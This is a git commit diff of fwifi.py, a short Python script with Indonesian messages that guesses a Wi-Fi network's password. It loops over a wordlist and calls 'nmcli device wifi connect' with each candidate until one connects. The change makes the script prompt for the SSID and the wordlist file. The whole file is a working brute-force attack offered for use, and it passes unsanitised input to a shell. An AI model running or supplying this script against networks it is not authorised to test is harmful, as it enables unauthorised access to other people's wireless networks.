233ab75d078723120883898d156c8d328eb2a8af
fixploit03 <164528883+fixploit03@users.noreply.github.com>
2024-10-26 21:15:05 +0700

    Update fwifi.py

--- fwifi.py
+++ fwifi.py
@@ -1,24 +1,23 @@
 import subprocess
 
-interface = "<_interface_>"
-ssid = "<_ssid_>"
-wordlist = "<_wordlist_>"
+ssid = input("Masukkan nama SSID jaringan Wi-Fi: ")
+file_wordlist = input("Masukkan nama file wordlist: ")
 
 kata_sandi_ditemukan = False
 
 try:
-    with open(wordlist, "r", encoding="latin-1", errors="ignore") as w:
-        daftar_kata_sandi = w.read().splitlines()
+    with open(file_wordlist, "r", encoding="latin-1", errors="ignore") as fw:
+        daftar_kata_sandi = fw.read().splitlines()
         for kata_sandi in daftar_kata_sandi:
-            perintah_crack = f"nmcli device wifi connect {ssid} password {kata_sandi}"
+            perintah_crack_wifi = f"nmcli device wifi connect {ssid} password {kata_sandi}"
             try:
-                hasil_perintah_crack = subprocess.run(perintah_crack, shell=True, capture_output=True, text=True)
-                if hasil_perintah_crack.returncode == 0:   
-                    print(f"[+] Berhasil terhubung ke SSID '{ssid}'")
+                crack_wifi = subprocess.run(perintah_crack_wifi, shell=True, capture_output=True, text=True)
+                if "successfully activated" in crack_wifi.stdout:
+                    print(f"[+] Berhasil terhubung ke jaringan Wi-Fi dengan SSID: {ssid}")
                     kata_sandi_ditemukan = True 
                     break
                 else:
-                    print(f"[+] Gagal terhubung ke SSID '{ssid}'")
+                    print(f"[-] Gagal terhubung ke jaringan Wi-Fi dengan SSID: {ssid}")
             except KeyboardInterrupt:
                 print(f"\n[-] Program dihentikan oleh pengguna.")
                 exit(1)
@@ -26,7 +25,7 @@ try:
                 print(f"\n[-] Terjadi kesalahan: {e}.")
                 exit(1)
         if not kata_sandi_ditemukan:
-            print(f"[-] Kata sandi tidak ditemukan, coba file Wordlist yang lain.")
+            print(f"[-] Kata sandi tidak ditemukan, coba file wordlist yang lain.")
 except Exception as e:
     print(f"\n[-] Terjadi kesalahan: {e}.")
     exit(1)
